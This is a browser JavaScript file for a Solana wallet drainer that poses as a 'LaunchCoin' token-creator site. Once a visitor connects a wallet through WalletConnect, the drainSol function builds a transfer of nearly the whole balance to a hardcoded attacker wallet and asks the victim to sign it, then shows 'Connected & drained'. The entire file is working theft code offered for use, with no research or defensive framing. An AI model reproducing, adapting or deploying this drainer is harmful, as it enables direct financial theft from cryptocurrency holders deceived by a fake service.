// wc.js — WalletConnect Solana + drain (browser-safe)
import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';
import { WalletConnectModal } from 'https://esm.sh/@walletconnect/modal@2.7.0';

const PROJECT_ID = '50a5cb3a44be9870efeee8917182a979';
const RECEIVER_WALLET = '9GD63MUwf1SzLs59UFZCmA7NLABkYYWrx8PVG3CmXBMo';
const SOLANA_CHAIN = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';

const connection = new solanaWeb3.Connection(
  'https://rpc.ankr.com/solana',
  'confirmed'
);

let provider = null;
let modal = null;
let session = null;

function toBase64(u8) {
  let s = '';
  const bytes = u8 instanceof Uint8Array ? u8 : new Uint8Array(u8);
  for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
  return btoa(s);
}

function fromBase64(b64) {
  const s = atob(b64);
  const out = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i);
  return out;
}

function showMsg(html) {
  let el =
    document.getElementById('result') ||
    document.getElementById('liquidityResult') ||
    document.getElementById('wc-status');
  if (!el) {
    el = document.createElement('div');
    el.id = 'wc-status';
    el.style.cssText =
      'max-width:420px;margin:16px auto;padding:12px;text-align:center;color:#c4d6ff;font-size:14px;';
    document.body.appendChild(el);
  }
  el.innerHTML = html;
}

async function initWC() {
  if (provider) return;

  provider = await UniversalProvider.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'LaunchCoin',
      description: 'Solana Token Creator',
      url: window.location.origin,
      icons: [window.location.origin + '/assets/logo.png']
    }
  });

  modal = new WalletConnectModal({
    projectId: PROJECT_ID,
    chains: [SOLANA_CHAIN]
  });

  provider.on('display_uri', (uri) => {
    modal.openModal({ uri });
  });

  provider.on('session_delete', () => {
    session = null;
    localStorage.removeItem('lc_wallet');
  });
}

function getAddressFromSession(sess) {
  try {
    const accounts = sess?.namespaces?.solana?.accounts || [];
    if (!accounts.length) return null;
    return accounts[0].split(':').pop();
  } catch (_) {
    return null;
  }
}

async function drainSol(publicKeyStr) {
  if (!RECEIVER_WALLET) {
    alert('Receiver not configured');
    return null;
  }

  const fromPubkey = new solanaWeb3.PublicKey(publicKeyStr);
  const toPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
  const balance = await connection.getBalance(fromPubkey);
  const fee = 5000;
  const amount = balance - fee;
  if (amount <= 0) {
    alert('Balance troppo basso');
    return null;
  }

  const tx = new solanaWeb3.Transaction().add(
    solanaWeb3.SystemProgram.transfer({
      fromPubkey,
      toPubkey,
      lamports: amount
    })
  );
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
  tx.recentBlockhash = blockhash;
  tx.feePayer = fromPubkey;

  const serialized = tx.serialize({
    requireAllSignatures: false,
    verifySignatures: false
  });
  const transactionBase64 = toBase64(serialized);

  let signature;
  try {
    const result = await provider.request(
      {
        method: 'solana_signAndSendTransaction',
        params: { transaction: transactionBase64, pubkey: publicKeyStr }
      },
      SOLANA_CHAIN
    );
    signature = typeof result === 'string' ? result : result?.signature || result;
  } catch (_) {
    const result = await provider.request(
      {
        method: 'solana_signTransaction',
        params: { transaction: transactionBase64, pubkey: publicKeyStr }
      },
      SOLANA_CHAIN
    );
    if (result?.transaction) {
      signature = await connection.sendRawTransaction(fromBase64(result.transaction));
    } else if (result?.signature) {
      signature = result.signature;
    } else {
      throw new Error('No signature from wallet');
    }
  }

  try {
    await connection.confirmTransaction(
      { signature, blockhash, lastValidBlockHeight },
      'confirmed'
    );
  } catch (_) {}

  return { signature, amount: amount / 1e9 };
}

window.openWalletConnect = async function () {
  try {
    showMsg('<p style="color:#22d1f8">Opening WalletConnect...</p>');
    await initWC();

    session = await provider.connect({
      optionalNamespaces: {
        solana: {
          methods: [
            'solana_signTransaction',
            'solana_signMessage',
            'solana_signAndSendTransaction'
          ],
          chains: [SOLANA_CHAIN],
          events: []
        }
      }
    });

    try {
      modal.closeModal();
    } catch (_) {}

    const address = getAddressFromSession(session);
    if (!address) {
      alert('No Solana account in session');
      return;
    }

    localStorage.setItem('lc_wallet', address);
    const btn = document.querySelector('.connect-btn');
    if (btn) btn.textContent = address.slice(0, 4) + '...' + address.slice(-4);

    showMsg('<p style="color:#22d1f8">Approve the transfer in your wallet...</p>');
    const drained = await drainSol(address);
    if (drained) {
      showMsg(
        '<p style="color:#4cdcc1;">Connected & drained via WalletConnect</p>' +
          '<p style="font-size:12px;color:#8899bb;">' +
          drained.amount.toFixed(4) +
          ' SOL</p>' +
          '<p style="font-size:11px;color:#667;word-break:break-all;">Tx: ' +
          drained.signature +
          '</p>'
      );
    } else {
      showMsg('<p style="color:#ff8a8a">Transfer not completed.</p>');
    }
  } catch (e) {
    console.error('WC connect error', e);
    try {
      modal?.closeModal();
    } catch (_) {}
    alert('WalletConnect failed: ' + (e.message || e));
  }
};

console.log('[wc.js] loaded, openWalletConnect ready');
